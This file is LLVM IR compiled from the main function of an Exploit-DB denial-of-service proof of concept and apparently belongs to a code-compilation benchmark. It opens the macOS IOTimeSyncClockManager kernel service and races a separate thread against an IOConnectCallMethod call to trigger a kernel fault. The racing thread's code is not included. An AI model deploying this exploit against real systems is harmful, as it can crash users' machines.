; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_43326.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_43326.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [23 x i8] c"IOTimeSyncClockManager\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i64 0, align 8
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@thread_func = common dso_local global i32 0, align 4
@go = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [4 x i8] c"%x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca [16 x i32], align 16
  %11 = alloca i32, align 4
  %12 = alloca [4096 x i8], align 16
  %13 = alloca i64, align 8
  %14 = alloca [16 x i32], align 16
  %15 = alloca i32, align 4
  %16 = alloca [4096 x i8], align 16
  %17 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* @kIOMasterPortDefault, align 4
  %19 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str, i64 0, i64 0))
  %20 = call i64 @IOServiceGetMatchingService(i32 %18, i32 %19)
  store i64 %20, i64* %7, align 8
  %21 = load i64, i64* %7, align 8
  %22 = load i64, i64* @IO_OBJECT_NULL, align 8
  %23 = icmp eq i64 %21, %22
  br i1 %23, label %24, label %26

24:                                               ; preds = %2
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %57

26:                                               ; preds = %2
  %27 = load i64, i64* @MACH_PORT_NULL, align 8
  store i64 %27, i64* %8, align 8
  %28 = load i64, i64* %7, align 8
  %29 = call i32 (...) @mach_task_self()
  %30 = call i64 @IOServiceOpen(i64 %28, i32 %29, i32 0, i64* %8)
  store i64 %30, i64* %6, align 8
  %31 = load i64, i64* %6, align 8
  %32 = load i64, i64* @KERN_SUCCESS, align 8
  %33 = icmp ne i64 %31, %32
  br i1 %33, label %34, label %36

34:                                               ; preds = %26
  %35 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %57

36:                                               ; preds = %26
  %37 = load i32, i32* @thread_func, align 4
  %38 = load i64, i64* %8, align 8
  %39 = inttoptr i64 %38 to i8*
  %40 = call i32 @pthread_create(i32* %9, i32* null, i32 %37, i8* %39)
  br label %41

41:                                               ; preds = %45, %36
  %42 = load i32, i32* @go, align 4
  %43 = icmp ne i32 %42, 0
  %44 = xor i1 %43, true
  br i1 %44, label %45, label %46

45:                                               ; preds = %41
  br label %41

46:                                               ; preds = %41
  store i32 0, i32* %11, align 4
  store i64 0, i64* %13, align 8
  store i32 1, i32* %15, align 4
  store i64 0, i64* %17, align 8
  %47 = load i64, i64* %8, align 8
  %48 = getelementptr inbounds [16 x i32], [16 x i32]* %10, i64 0, i64 0
  %49 = load i32, i32* %11, align 4
  %50 = getelementptr inbounds [4096 x i8], [4096 x i8]* %12, i64 0, i64 0
  %51 = load i64, i64* %13, align 8
  %52 = getelementptr inbounds [16 x i32], [16 x i32]* %14, i64 0, i64 0
  %53 = getelementptr inbounds [4096 x i8], [4096 x i8]* %16, i64 0, i64 0
  %54 = call i64 @IOConnectCallMethod(i64 %47, i32 1, i32* %48, i32 %49, i8* %50, i64 %51, i32* %52, i32* %15, i8* %53, i64* %17)
  store i64 %54, i64* %6, align 8
  %55 = load i64, i64* %6, align 8
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0), i64 %55)
  store i32 0, i32* %3, align 4
  br label %57

57:                                               ; preds = %46, %34, %24
  %58 = load i32, i32* %3, align 4
  ret i32 %58
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i64*) #1

declare dso_local i32 @mach_task_self(...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i8*) #1

declare dso_local i64 @IOConnectCallMethod(i64, i32, i32*, i32, i8*, i64, i32*, i32*, i8*, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
